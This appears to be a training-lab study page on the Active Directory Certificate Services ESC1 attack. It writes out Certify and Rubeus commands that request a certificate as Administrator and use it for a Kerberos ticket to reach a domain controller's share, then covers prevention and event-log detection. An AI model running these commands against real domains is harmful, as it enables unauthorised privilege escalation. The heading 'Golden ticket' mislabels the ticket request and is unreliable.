# PKI - ESC1

After `SpectreOps` released the research paper [Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf), `Active Directory Certificate Services` (`AD CS`) became one of the most favorite attack vectors for threat agents due to many reasons, including:

1. using certificates has more advantages for the hacker
2. Most PKI servers are missconfigured for at least one of the eight attacks described in the research paper above.

Why compromise the CA (certificate authority)?

* Users and machines certificates are valid for 1+ years.
* Resetting a user password does not invalidate the certificate.
* Misconfigured templates allow for obtaining a certificate for any user.
* Compromising the CA's private key results in forging `Golden Certificates`.

While SpectreOps found and describen 8 attack vectors for privilage escalation techniques we will focus on the first - ESC1

`Domain escalation via No Issuance Requirements + Enrollable Client Authentication/Smart Card Logon OID templates + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`

***

## Attack

<mark style="color:yellow;">1.</mark>\
To begin with, we will use [Certify](https://github.com/GhostPack/Certify) to scan the environment for vulnerabilities in the PKI infrastructure:

### Scan the network

```powershell-session
PS C:\Users\bob\Downloads> .\Certify.exe find /vulnerable
```

<figure><img src="../../../.gitbook/assets/Pasted image 20250421114239.png" alt=""><figcaption></figcaption></figure>

The template is vulnerable because:

* All Domain users can request a certificate on this template.
* The flag [CT\_FLAG\_ENROLLEE\_SUPPLIES\_SUBJECT](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1) is present, allowing the requester to specify the `SAN` (therefore, any user can request a certificate as any other user in the network, including privileged ones).
* Manager approval is not required (the certificate gets issued immediately after the request without approval).
* The certificate can be used for 'Client Authentication' (we can use it for login/authentication).



<mark style="color:yellow;">2.</mark>\
To abuse this template, we will use `Certify` and pass the argument `request` by specifying the full name of the CA, the name of the vulnerable template, and the name of the user, for example, `Administrator`

### Abuse the vulnerable template

```powershell-session
PS C:\Users\bob\Downloads> .\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator
```

<figure><img src="../../../.gitbook/assets/Pasted image 20250421114559.png" alt=""><figcaption></figcaption></figure>

Once the attack finishes, we will obtain a certificate successfully. The command generates a `PEM` certificate and displays it as base64. We need to convert the `PEM` certificate to the [PFX](https://learn.microsoft.com/en-us/windows-hardware/drivers/install/personal-information-exchange---pfx--files) format by running the command mentioned in the output of Certify (when asked for the password, press `Enter` without providing one), however, to be on the safe side, let's first execute the below command to avoid bad formatting of the `PEM` file.

### as

```shell-session
batamladen@htb[/htb]$ sed -i 's/\s\s\+/\n/g' cert.pem
```

<mark style="color:yellow;">3.</mark>\
Then we can execute the `openssl` command mentioned in the output of Certify.

<figure><img src="../../../.gitbook/assets/Pasted image 20250421114842.png" alt=""><figcaption></figcaption></figure>

<mark style="color:yellow;">4.</mark>\
Now that we have the certificate in a usable `PFX` format (which `Rubeus` supports), we can request a Kerberos TGT for the account `Administrator` and authenticate with the certificate:

### Golden ticket

```powershell-session
PS C:\Users\bob\Downloads> .\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt
```

<figure><img src="../../../.gitbook/assets/Pasted image 20250421114951 (1).png" alt=""><figcaption></figcaption></figure>

After successful authentication, we will be able to list the content of the `C$` share on DC1

```powershell-session
PS C:\Users\bob\Downloads> dir \\dc1\c$
```

<figure><img src="../../../.gitbook/assets/Pasted image 20250421115020.png" alt=""><figcaption></figcaption></figure>

***

#### Prevention

The attack would not be possible if the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag is not enabled in the certificate template. Another method to thwart this attack is to require `CA certificate manager approval` before issuing certificates; this will ensure that no certificates on potentially dangerous templates are issued without manual approval (which hopefully correlates that the request originated from a legit user).

Because there are many different privilege escalation techniques, it is highly advised to regularly scan the environment with `Certify` or other similar tools to find potential PKI issues.

***

## Detection

**📌 Certificate Request Logging**

* Two main logs appear when a certificate is requested and issued:
  * **Event ID 4886** → Certificate request received
  * **Event ID 4887** → Certificate request approved and issued



**📁 Viewing Issued Certificates**

* CA keeps a list of issued certs
* GUI does **not show SAN** directly — need to inspect the certificate



**🛠 Dump All Cert Info**

```
certutil -view
```

* Dumps **all certificate info** from the CA (can be large



**🧠 Detecting Certificate Usage in Attack**

* If cert is used for **authentication**, AD logs this with:
  * **Event ID 4768** → Logon attempt using a certificate



**💻 Remote Access to CA (if GUI not available)**

```
runas /user:eagle\htb-student powershell New-PSSession PKI Enter-PSSession PKI
```



**🔍 Get Certificate Events via PowerShell**

```
Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'} Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4887'}
```



**🔎 View Full Event Details**

```
$events = Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'} $events[0] | Format-List -Property *
```
